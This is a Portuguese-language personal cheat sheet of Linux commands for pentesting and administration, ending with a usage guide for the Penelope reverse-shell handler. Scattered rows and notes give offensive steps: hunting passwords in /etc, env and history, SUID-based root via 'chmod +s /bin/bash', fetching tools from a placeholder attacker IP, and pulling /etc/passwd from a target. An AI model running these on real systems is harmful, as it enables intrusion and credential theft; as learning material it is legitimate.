# 🐧 Linux — Comandos Essenciais

> [!Fonte de onde pego os ensinamentos e dicas]
> https://notebooklm.google.com/notebook/556e39f1-065f-4755-b85c-d3ae7090b385

> Referência rápida de comandos Linux para hacking e administração de sistemas.

---

## 1. 📂 Navegação — Localizando-se no Sistema

Antes de agir, você precisa saber **onde está** e **o que há ao seu redor**.

| Comando | Função | Exemplo |
|---|---|---|
| `pwd` | Onde estou? Exibe o caminho completo do diretório atual | `pwd` → `/home/gbmel` |
| `ls` | O que tem aqui? Lista arquivos e pastas | `ls -la` (inclui ocultos + detalhes) |
| `ls -la` | Lista **tudo**, incluindo permissões, dono, tamanho e arquivos ocultos (`.`) | Essencial para Privilege Escalation |
| `cd` | Mudar de diretório | `cd /var/www/html` |
| `cd ..` | Subir um nível na hierarquia | Sai de `/home/gbmel` para `/home` |
| `cd ~` | Voltar para sua pasta pessoal (home) | Atalho útil |
| `cd -` | Voltar ao diretório anterior | Alterna entre dois diretórios |

> **O `.` no Linux** marca arquivos como **ocultos** (ex: `.bash_history`, `.env`, `.ssh/`). Eles só aparecem com `ls -la`. Em hacking, arquivos ocultos frequentemente guardam **senhas e configurações sensíveis**.

---

## 2. 📝 Manipulação — Criando e Movendo Arquivos

| Comando | Função | Exemplo |
|---|---|---|
| `touch` | Cria um arquivo vazio | `touch exploit.sh` |
| `mkdir` | Cria uma nova pasta | `mkdir -p /tmp/tools` (-p cria intermediárias) |
| `cp` | Copia arquivos ou pastas (`-r` para pastas) | `cp shell.php /var/www/html/` |
| `mv` | Move ou renomeia arquivos/pastas | `mv script.py /tmp/` |
| `rm` | Remove arquivos | `rm arquivo.txt` |
| `rm -rf` | Remove pasta inteira **sem confirmação** | ⚠️ **Sem lixeira!** Irreversível! |
| `chmod` | Altera permissões de arquivos | `chmod +x script.sh` (torna executável) |
| `chown` | Altera o dono de um arquivo | `chown root:root file` |

---

## 3. 🔍 Visualização e Busca — Analisando Conteúdo

Essencial para ler configurações ou encontrar informações em textos longos.

| Comando | Função | Uso em Hacking |
|---|---|---|
| `cat` | Exibe todo o conteúdo de um arquivo | `cat /etc/passwd` |
| `less` / `more` | Abre o arquivo por páginas (navegar com setas) | Arquivos grandes sem poluir o terminal |
| `head -n 20` | Exibe as primeiras 20 linhas | Verificar início de logs |
| `tail -n 20` | Exibe as últimas 20 linhas | Verificar logs recentes |
| `tail -f` | Monitora um arquivo em tempo real | `tail -f /var/log/auth.log` |
| `grep` | Pesquisa palavras/padrões dentro de arquivos | **Comando mais usado em segurança!** |
| `grep -r "password" /etc/` | Busca recursiva por "password" em todos os arquivos de /etc | Encontrar senhas em configs |
| `grep -i` | Busca case-insensitive | `grep -i "secret" .env` |
| `find` | Busca arquivos por nome, tipo, permissão | `find / -name "*.conf"` |
| `find / -perm -u=s` | Busca binários com SUID | **Fundamental para PrivEsc!** |
| `wc -l` | Conta número de linhas | `cat /etc/passwd \| wc -l` |

---

## 4. 👤 Sistema e Identidade — Quem é você?

| Comando | Função | Uso em Hacking |
|---|---|---|
| `whoami` | Mostra o usuário logado | Primeira coisa após obter shell |
| `id` | Mostra UID, GID e grupos | Verificar grupos especiais (docker, lxd) |
| `sudo -l` | Lista o que pode executar como root | **Vetor #1 de PrivEsc!** |
| `sudo su` | Virar root (se tiver permissão) | Escalar privilégios |
| `su usuario` | Trocar para outro usuário | Pivotar com credenciais encontradas |
| `uname -a` | Versão do kernel e sistema | Buscar kernel exploits |
| `cat /etc/os-release` | Distribuição e versão do OS | Identificar o sistema |
| `df -h` | Espaço livre em disco (legível) | Verificar partições |
| `free -h` | Uso de memória RAM | Diagnóstico do sistema |
| `env` | Mostra variáveis de ambiente | Pode conter senhas/tokens! |
| `history` | Histórico de comandos do usuário | Procurar senhas digitadas |

---

## 5. ⚙️ Processos e Rede — O que o sistema está fazendo?

| Comando | Função | Uso em Hacking |
|---|---|---|
| `ps aux` | Lista TODOS os processos rodando | Identificar serviços/processos de root |
| `top` / `htop` | Consumo de CPU e RAM em tempo real | Monitoramento |
| `kill [PID]` | Encerra um processo pelo ID | Matar processos travados |
| `kill -9 [PID]` | Força encerramento | Quando `kill` normal não funciona |
| `ping` | Testa conectividade com IP/host | Verificar se o alvo está vivo |
| `ifconfig` / `ip addr` | Configurações de rede e IP | Descobrir interfaces e IPs |
| `ip route` | Tabela de roteamento | Identificar o gateway |
| `netstat -tulnp` | Portas abertas e serviços escutando | Encontrar serviços internos |
| `ss -tulnp` | Alternativa moderna ao netstat | Mesmo uso |
| `curl` / `wget` | Baixar arquivos ou fazer requisições HTTP | Transferir ferramentas para o alvo |

---

## 6. 📦 Gerenciamento de Pacotes

| Distro | Instalar | Atualizar | Buscar |
|---|---|---|---|
| **Debian/Kali/Ubuntu** | `sudo apt install pacote` | `sudo apt update && sudo apt upgrade` | `apt search pacote` |
| **Arch/BlackArch** | `sudo pacman -S pacote` | `sudo pacman -Syu` | `pacman -Ss pacote` |

---

## 7. 🔐 Permissões Linux — Entendendo o `ls -la`

```
-rwxr-xr-x  1  root  root  4096  Jan 15 10:00  script.sh
│├─┤├─┤├─┤  │  │     │     │     │              └── Nome do arquivo
││  │  │    │  │     │     │     └── Data de modificação
││  │  │    │  │     │     └── Tamanho em bytes
││  │  │    │  │     └── Grupo dono
││  │  │    │  └── Usuário dono
││  │  │    └── Número de links
││  │  └── Permissões de OUTROS (o+rwx)
││  └── Permissões do GRUPO (g+rwx)
│└── Permissões do DONO (u+rwx)
└── Tipo (- = arquivo, d = diretório, l = link)
```

| Letra | Valor | Significado |
|---|---|---|
| `r` | 4 | Read (ler) |
| `w` | 2 | Write (escrever) |
| `x` | 1 | Execute (executar) |

```bash
chmod 777 arquivo    # rwxrwxrwx — todos podem tudo (INSEGURO!)
chmod 755 arquivo    # rwxr-xr-x — dono faz tudo, resto lê/executa
chmod 644 arquivo    # rw-r--r-- — dono lê/escreve, resto só lê
chmod +s arquivo     # SUID bit — executa como DONO do arquivo (perigo!)
```

> **Em hacking:** `chmod +s /bin/bash` seguido de `bash -p` = root instantâneo. É o payload mais comum de privilege escalation.

---

## 8. 🔧 Redirecionamento e Pipes

| Símbolo | Função | Exemplo |
|---|---|---|
| `>` | Redireciona saída para arquivo (sobrescreve) | `echo "payload" > shell.sh` |
| `>>` | Redireciona saída (append — adiciona ao final) | `echo "linha" >> arquivo.txt` |
| `\|` | Pipe — envia saída de um comando como entrada de outro | `cat /etc/passwd \| grep root` |
| `2>/dev/null` | Descarta mensagens de erro | `find / -name "*.conf" 2>/dev/null` |
| `&` | Executa em background | `nc -lvnp 4444 &` |
| `&&` | Executa o próximo SE o anterior funcionar | `cd /tmp && wget http://...` |

---

## 9. 🐚 Penelope — Reverse Shell Handler

> **O que é:** Substituto avançado do `nc -lvnp`. Recebe reverse shells e faz upgrade automático para TTY interativa.
> **GitHub:** https://github.com/brightio/penelope
> **Caminho:** `/home/gbmel/.local/bin/penelope`

### Iniciar o Listener
```bash
# Listener na porta 4444 (padrão)
penelope

# Listener em porta específica
penelope -p 9001

# Listener em múltiplas portas ao mesmo tempo
penelope -p 4444,5555,6666

# Listener em interface específica (padrão: 0.0.0.0 = todas)
penelope -i 10.10.14.5

# Iniciar já no menu principal (sem esperar shell)
penelope -M
```

### Flags Importantes
```bash
penelope -a              # Mostra payloads de reverse shell prontos para copiar!
penelope -l              # Lista interfaces de rede disponíveis
penelope -L              # Desabilita log de sessão
penelope -S              # Aceita apenas 1 sessão (single session)
penelope -C              # Não auto-attach em novas sessões
penelope -U              # Desabilita upgrade automático da shell
penelope -O              # Modo OSCP-safe (sem ferramentas extras)
penelope -m 3            # Manter 3 sessões por alvo
```

### Servidor HTTP (transferir arquivos para o alvo)
```bash
# Servir arquivos da pasta atual na porta 8000
penelope -s

# Servir em porta específica
penelope -s -p 8080

# No alvo, baixar com:
# wget http://SEU_IP:8000/linpeas.sh
```

### Bind Shell (conectar a uma porta aberta no alvo)
```bash
# Conectar a um bind shell no alvo
penelope -c ALVO_IP -p PORTA
```

### Comandos Internos (dentro da Penelope)

**Após receber uma shell, use estes comandos:**

| Comando | Função |
|---|---|
| `Ctrl+C` | **Vai para o menu** (NÃO mata a sessão!) |
| `Enter` | Volta para a sessão ativa |
| `sessions` | Lista todas as shells conectadas |
| `use 1` | Troca para sessão nº 1 |
| `download /etc/passwd` | Baixa arquivo do alvo → sua máquina |
| `upload linpeas.sh /tmp/` | Envia arquivo sua máquina → alvo |
| `spawn` | Abre novo listener em outra porta |
| `upgrade` | Força upgrade para PTY (geralmente automático) |
| `dir` | Muda o diretório de downloads |
| `kill 1` | Encerra sessão nº 1 |
| `exit` | Sai da Penelope |

> **Dica:** Use `penelope -a` quando já estiver no listener — ele gera e mostra os payloads de reverse shell prontos para copiar e colar no alvo!